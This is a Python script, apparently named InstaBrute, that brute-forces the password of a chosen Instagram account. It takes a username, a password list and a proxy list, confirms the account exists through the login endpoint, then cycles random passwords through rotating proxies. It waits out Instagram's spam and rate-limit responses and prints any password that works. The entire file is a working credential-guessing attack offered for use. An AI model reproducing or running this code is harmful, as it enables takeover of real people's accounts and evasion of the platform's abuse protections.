# -*- coding: utf-8 -*-

"""
Created on July 2022

@author: Hosein Khanali
"""
try:
    import sys
    import random
    from time import sleep
    from requests import *
    from datetime import datetime
    from colorama import init
    import urllib.request
except:
    print('please install libraries')
    sys.exit()

init()

# colors
BLUE = '\033[94m'
GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = "\033[93m"
LINK = "\033[34m"
RESET = "\033[0;0m"

# banner
print(BLUE + """
  _____           _          ___            _       
  \_   \_ __  ___| |_ __ _  / __\_ __ _   _| |_ ___ 
   / /\/ '_ \/ __| __/ _` |/__\// '__| | | | __/ _ 
/\/ /_ | | | \__ \ || (_| / \/  \ |  | |_| | ||  __/
\____/ |_| |_|___/\__\__,_\_____/_|   \__,_|\__\___|
""")
print("" + RED,
"#####################################################\n",
"## " + BLUE + "InstaBrute v 1.0                                " + RED + "##\n",
"##                                                 ##\n",
"## " + GREEN + "Author :" + LINK + " Hosein Khanali                         " + RED + "##\n",
"## " + GREEN + "Github :" + LINK + " https://github.com/hosein-khanalizadeh " + RED + "##\n",
"#####################################################\n" + RESET)

# set header
home_url = "https://www.instagram.com/"
login_url = "https://www.instagram.com/accounts/login/ajax/"
header = {
    'user-agents' : 'Mozilla/5.0',
    'x-requested-with': 'XMLHttpRequest',
    'referer': 'https://www.instagram.com/',
}

# username
username = input('username >>> ')

# password list
p = input('passlist (passlist.txt) >>> ')
if p == '':
    passwords = open('passlist.txt', 'r').readlines()
else:
    try:
        passwords = open(p, 'r').readlines()
    except:
        print(RED + 'Incorrect password list name !')
        sys.exit()

# proxy list
pr = input('proxy (proxy.txt) >>> ')
if pr == '':
    proxies = open('proxy.txt', 'r').readlines()
else:
    try:
        proxies = open(pr, 'r').readlines()
    except:
        print(RED + 'Incorrect proxy list name !')
        sys.exit()

# check proxies
def check_proxy(proxy):
    try:
        proxy_handler = urllib.request.ProxyHandler({'http': proxy})
        opener = urllib.request.build_opener(proxy_handler)
        opener.addheaders = [('User-agent', 'Mozilla/5.0')]
        urllib.request.install_opener(opener)
        sock = urllib.request.urlopen('http://www.google.com')
    except urllib.error.HTTPError as e:
        return e.code
    except Exception as detail:
        return 1
    return 0

# set proxy
def set_proxy(session,p):
    proxy = {
            'http'  : 'http://' + p,
            }
    session.proxies.update(proxy)

# set csrf token
def set_cookies(session):
    try:
        token = session.get(home_url).cookies.get_dict()["csrftoken"]
        session.headers.update({"x-csrftoken": token})
    except Exception as e:
        message = '[!] ERROR (180 s) csrftoken failed !'
        print(RED + message)
        sleep(200)
        bruter(session)

# try login
def login(session , data:dict):
    try:
        req = session.post(login_url, data=data)
        print(req)
        sleep(50)
        return req
    except Exception as e:
        message = '[!] ERROR (10 s) Connection Failed !'
        print(RED + message)
        return 0

# check user exist
def check_user(session):
    data = {
        'username': username,
    }
    req = session.post(login_url, data=data)
    if req.json()['user']:
        return 1
    else:
        return 0

# brute force attack
def bruter(session):
    while 1:
        p = random.choice(proxies)
        if check_proxy(p):
            set_proxy(session,p)
            password = random.choice(passwords)
            data = {
                    'username': username,
                    'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{int(datetime.now().timestamp())}:{password}',
                    }
            req = login(session , data)
            if req != 0:
                if req.status_code == 200:
                    if req.json()['authenticated']:
                        message = "[+] Password Found ! => {0} | {1}".format(username , password)
                        print(GREEN + message)
                        sleep(5)
                        sys.exit()
                    else:
                        message = ("[-] Password not Found ! => {0} | {1}".format(username , password))
                        print(RED + message)
                        sleep(100)
                    passwords.remove(password)
                elif req.status_code == 429:
                    if req.json()['spam']:
                        message = ("[!] ERROR 429 (360 s) - Instagram Spam ... ")
                        print(RED + message)
                        sleep(360)
                    else:
                        message = ('[!] ERROR (360 s) We have a Problme !')
                        print(RED + message)
                        sleep(360)
                elif req.status_code == 403:
                    if req.json()['message'] == 'Please wait a few minutes before you try again.':
                        message = ("[!] ERROR 403 (360 s) - Instagram Spam ... ")
                        print(RED + message)
                        sleep(360)

def main():
    session = Session()
    session.headers.update(header)
    set_cookies(session)
    if check_user(session):
        bruter(session)
    else:
        print(RED + 'user not exist !')
        sys.exit()

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print()
        print('[-] ^C received . shutting down server !')
        sys.exit()
